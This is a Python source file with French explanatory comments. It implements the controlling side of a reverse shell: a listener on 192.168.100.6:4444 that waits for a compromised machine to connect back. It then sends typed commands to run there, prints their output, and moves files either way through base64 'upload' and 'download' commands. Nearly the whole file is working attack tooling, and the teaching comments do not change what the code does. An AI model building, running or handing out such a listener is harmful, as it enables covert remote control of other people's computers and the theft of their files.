# pour ouvrir les sessions de connexion.
import socket 
# pour transformer les données binaires en JSON afin de faciliter le transfert des données.
import json
# pour encoder ou décoder les données, notamment lorsqu’il s’agit de fichiers au format image.
import base64

'''
L’idée principale de ce code est de créer un reverse shell listener
l'objectif :
-attend une connexion d’un client distant
-envoie et reçoit des commandes au format JSON
-peut transférer des fichiers (upload / download)
-et exécute des commandes à distance sur la machine connectée.
'''
class Listener:

    def __init__(self,ip, port):
        # explication :
        '''
        Lors de l'initialisation, le serveur crée un socket TCP (socket.SOCK_STREAM) configuré 
        avec l'option SO_REUSEADDR pour pouvoir réutiliser l'adresse après une coupure, effectue le bind sur l'adresse IP et le port spécifiés,
        puis passe en mode écoute (listen). Ensuite il attend une connexion entrante avec accept et associe la socket obtenue à self.connection, 
        ce qui met le programme en état de serveur prêt à communiquer avec un client.
        '''
        listenner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listenner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 ) # set socket options
        # si il ya un drop ou une copure dans la connection cette commande va ne fair le listenner a neuvaux
        listenner.bind((ip,port)) # fair attention au port il suffit il serra pour le listnner unique
        listenner.listen(0) #le nb signfie que le nb des machin qui va attendr # 0 pour que en connect directement c'est le backlog
        print("[+] waiting for connection ")
        self.connection, address = listenner.accept()# self c'est pour le save dans une methode au d'autre
        print("[+] Connection Successful from "+ str(address))

    # explication :
    '''
    Les méthodes safe_send et safe_receive garantissent l’échange structuré de données au format JSON entre le client et le serveur.
    safe_send(data) sérialise un objet Python en JSON, le convertit en bytes puis l’envoie via le socket, tandis que safe_receive() lit les bytes reçus,
    les accumule jusqu’à reconstituer un JSON complet puis désérialise ce JSON en objet Python réutilisable. 🔹 Cela assure que les messages sont correctement formatés 
    et que les envois/réceptions restent fiables et robustes.
    '''
    def safe_send(self, data): # l envoi des donne en format json
        json_data = json.dumps(data)# convert our data to json
        self.connection.send(json_data.encode())
    
    def safe_receive(self):#le recvoir d donner json et le transfer en normal format   
        json_data = b""
        while True :
            try:# try si vrais ou il ya ValueError 
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError :
                continue
    #  cette boucle pour evite le buffer des donner 

    def execute_commands(self,command):
        # explication 
        '''
        La méthode execute_commands envoie une commande au client via safe_send.
        Si la commande reçue est exit, elle ferme proprement la connexion et termine l’exécution du programme 
        sinon, elle attend la réponse du client avec safe_receive et traite le résultat renvoyé.
        Typiquement, le client distant exécute la commande sur sa machine (par exemple dir, ls, cat, etc.) puis retourne la sortie standard au serveur. 
        Cela permet au serveur d’exécuter à distance des commandes et de recevoir leurs résultats de manière ordonnée et sûre
        '''
        self.safe_send(command)
        if command[0] == 'exit': 
            self.connection.close()
            exit()
        
        return self.safe_receive()

    # explication :
    '''
    Les méthodes read_file et write_file gèrent le transfert de fichiers.
    read_file lit un fichier, l’encode en Base64 pour l’envoyer (upload),
    tandis que write_file décode le contenu reçu et crée le fichier localement (download). 
     L’encodage Base64 permet de transmettre des fichiers binaires via une connexion JSON
    '''
    def write_file(self,path,content):#3*
        with open(path, "wb") as file :
            file.write(base64.b64decode(content))#4*
            return "[+] download was successful " 
    def read_file(self, path):#5*
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
        
    
    def run(self):
        #explication :
        '''
        Le serveur entre dans une boucle infinie où il attend les commandes de l’utilisateur.
        Chaque commande est découpée (split) avant d’être envoyée au client sous forme de liste. 
        Les commandes spéciales sont gérées séparément :
        - upload <fichier> → lit et envoie le fichier au client.
        - download <fichier> → reçoit et enregistre le fichier localement.
        Le serveur affiche ensuite le résultat renvoyé par la machine distante.
        Cette boucle assure une interaction continue entre le serveur et le client, simulant un terminal distant.
        '''
        while True :
            command = input(">> ") #python2.7.18
            command = command.split(" ") 
            try:
                if command[0] == "upload" :#5*
                    file_content = self.read_file(command[1]).decode()
                    command.append(file_content)   

                result = self.execute_commands(command)

                if command[0] == "download" and "[-] There " not in result:
                    command_result =  self.write_file(command[1],result)
            except Exception:
                result = "[-] There was an error on the command "    
            print(result)

  

my_listener = Listener("192.168.100.6",4444)
my_listener.run()


# l'order run->excute_command->safe_send->safe_recive->run: 

#process upload/download 
#read 
#send
#empty file 
# 